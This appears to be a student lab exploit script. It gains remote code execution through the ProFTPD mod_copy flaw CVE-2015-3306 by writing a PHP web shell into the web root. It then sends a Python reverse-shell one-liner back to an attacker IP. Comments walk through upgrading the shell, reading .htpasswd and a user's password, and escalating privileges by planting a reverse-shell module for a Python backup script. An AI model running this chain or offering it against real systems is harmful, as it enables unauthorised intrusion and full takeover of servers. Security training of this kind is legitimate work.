import socket
import requests
import os

# 1. Without using Metasploit, achieve remote code execution on the 192.168.229.105 box with CVE-2015-3306. Students should synthesize what they have learned from reviewing other exploit code to write a Python 3 script that automates the deployment of a PHP web shell.

with socket.socket() as s:
    s.connect(("192.168.229.105",21))
    s.send(b"SITE CPFR /proc/self/cmdline\n")
    s.send(b"SITE CPTO /tmp/<?php system($_GET['c']) ?>\n")
    s.send(b"SITE CPFR /tmp/<?php system($_GET['c']) ?>\n")
    s.send(b"SITE CPTO /var/www/html/my.php\n")

# 2. Using your newly established remote code execution, create a reverse shell connection from the victim machine back to your attacker machine. Use whatever appropriate port of your choosing.
# NOTE: Do not forget to set up a listener! nc -lnvp 9001

rev_shell = "python -c 'import os,socket;s=socket.socket();s.connect((\"192.168.229.30\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"/bin/sh\")'"

r = requests.get("http://192.168.229.105/my.php", params = {'c':rev_shell})

# 3. Upgrade your reverse shell with some terminal niceties (executed on listener):

# python -c “import pty; pty.spawn(‘/bin/bash’)”
# ^Z (press Control+Z to background your reverse shell process)
# stty raw -echo
# fg (you will not see your input but trust that it is there!)
# export TERM=screen
# ls /home
# ls -la
# cat .htpasswd
# cat dev_note.txt
# ls backup/
# su meaghyn
# meaghyn
# whoami -> meaghyn
# cat dev_note.txt
# ls backup
# cat ./backup/script.py
# start another listener on host machine
# python -c "import pty; pty.spawn('/bin/bash')"
# cd backup
# vi pwd.py

#!/usr/bin/env python3
import os, socket
s = socket.socket()
s.connect(("192.168.229.30", 9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("bin/sh")

# cp pwd ./backup/pwd.py
# 







# 4. Perform some basic enumeration. Are there other user accounts on this box?
# 5. Can you access any of the files in this user’s home directory? If so, which?
# 6. What is this user’s password?
# 7. Switch to their user account with su <username>. You may need to reinvoke bash. What file can you now read?
# 8. Take advantage of the Python backup script to escalate your privileges.
# HINT: Do you remember where Python modules are loaded from?